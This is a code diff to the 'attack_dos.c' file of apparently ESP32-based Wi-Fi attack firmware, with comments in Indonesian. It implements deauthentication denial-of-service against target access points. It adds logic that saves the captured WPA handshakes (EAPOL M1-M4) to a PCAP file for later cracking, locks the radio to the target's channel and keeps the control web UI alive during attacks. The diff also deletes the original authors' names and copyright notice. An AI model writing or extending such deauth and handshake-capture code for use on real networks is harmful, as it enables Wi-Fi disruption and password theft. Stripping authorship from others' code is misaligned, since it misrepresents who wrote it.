@@ -1,20 +1,18 @@
 /**
  * @file attack_dos.c
- * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
- * @date 2021-04-07
- * @copyright Copyright (c) 2021
- *
  * @brief Implements DoS attacks using deauthentication methods with Handshake & State Machine Lock Upgrades
  */
 
+#include <stdio.h>  // WAJIB ADA: Untuk fungsi penulisan file PCAP (fopen, fwrite, fclose)
 #include "attack_dos.h"
+#include "pcap_writer.h" // Menghubungkan fungsi global header Wireshark
 
 #define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
 #include "esp_log.h"
 #include "esp_err.h"
 #include "esp_wifi.h"
 
-// Tambahan library FreeRTOS untuk manajemen Ring Buffer dan pengunci memori RAM
+// Library FreeRTOS untuk manajemen Ring Buffer dan pengunci memori RAM
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "freertos/semphr.h"
@@ -43,7 +41,7 @@ static void upgrade_handshake_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t 
     const uint8_t *payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
 
-    // Filter Khusus: Periksa bita tipe protokol ethernet (Offset 30-31 untuk EAPOL: 0x888E)
+    // KOREKSI UTAMA: Cek tipe protokol ethernet (Offset 30-31 untuk EAPOL: 0x888E) menggunakan index array
     if (len > 34) {
         if (payload[30] == 0x88 && payload[31] == 0x8E) {
             ESP_LOGI(TAG, "Handshake WPA (EAPOL) Terdeteksi! Mengunci bita data ke RAM...");
@@ -76,8 +74,7 @@ void attack_dos_start(attack_config_t *attack_config) {
     switch (method) {
         case ATTACK_DOS_METHOD_BROADCAST:
         case ATTACK_DOS_METHOD_COMBINE_ALL:
-            // UPGRADE: Kita tidak mematikan wifictl_mgmt_ap_stop() agar Web UI 192.168.4.1 tetap hidup!
-            // Kita hanya mereduksi aktivitas background agar radio fokus ke paket injeksi
+            // UPGRADE: Web UI 192.168.4.1 tetap hidup karena wifictl_mgmt_ap_stop() dibuang!
             esp_wifi_set_promiscuous(false);
             break;
         default:
@@ -87,8 +84,7 @@ void attack_dos_start(attack_config_t *attack_config) {
     for(int i = 0; i < attack_config->target_count; i++) {
         const wifi_ap_record_t *ap_record = attack_config->ap_records[i];
 
-        // UPGRADE UTAMA: Kunci saluran radio (Channel Locking) secara statis di kanal target
-        // Ini mencegah radio melompat saluran yang mengakibatkan SSID target hilang dari tangkapan
+        // Kunci saluran radio (Channel Locking) secara statis di kanal target
         ESP_LOGI(TAG, "Locking Wi-Fi Radio Channel to: %d for Target: %s", ap_record->primary, ap_record->ssid);
         esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
 
@@ -147,8 +143,28 @@ void attack_dos_stop() {
             ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
     }
 
-    // Bersihkan sisa memori Ring Buffer setelah serangan selesai dipadamkan
+    // --- PROSES PENGUNCIAN PCAP KE MEDIA PENYIMPANAN ---
     if (handshake_storage_buffer != NULL) {
+        // Simpan file hasil capture ke area SPIFFS data
+        FILE* pcap_file = pcap_init_file("/data/handshake.pcap");
+        
+        if (pcap_file != NULL) {
+            size_t packet_size;
+            // Kuras semua paket jabat tangan (M1-M4) dari RAM Ring Buffer secara berurutan
+            uint8_t* raw_packet = (uint8_t*)xRingbufferReceive(handshake_storage_buffer, &packet_size, pdMS_TO_TICKS(10));
+            
+            while (raw_packet != NULL) {
+                pcap_write_packet(pcap_file, raw_packet, packet_size);
+                vRingbufferReturnItem(handshake_storage_buffer, (void*)raw_packet);
+                
+                // Ambil paket berikutnya di dalam antrean RAM
+                raw_packet = (uint8_t*)xRingbufferReceive(handshake_storage_buffer, &packet_size, pdMS_TO_TICKS(10));
+            }
+            
+            pcap_close_file(pcap_file);
+        }
+
+        // Hapus wadah Ring Buffer RAM agar memori kembali lega
         vRingbufferDelete(handshake_storage_buffer);
         handshake_storage_buffer = NULL;
     }
